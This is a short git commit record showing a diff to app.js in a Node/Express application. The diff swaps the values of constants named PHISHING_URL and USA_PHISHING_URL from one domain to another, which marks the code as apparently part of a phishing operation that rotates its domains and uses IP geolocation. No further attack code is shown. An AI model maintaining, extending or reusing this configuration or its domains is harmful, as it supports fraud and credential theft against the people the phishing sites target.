6ac4608f1445fc9fce50aec7cbae569dae7a35b8
hisenberg <me@someine.com>
2025-05-31 16:35:48 -0700

    new

--- app.js
+++ app.js
@@ -8,8 +8,8 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
-const PHISHING_URL = "votpicklify.pro";
-const USA_PHISHING_URL = "votpicklify.pro";
+const PHISHING_URL = "votrio.pro";
+const USA_PHISHING_URL = "votrio.pro";
 
 
 // CONFIGS
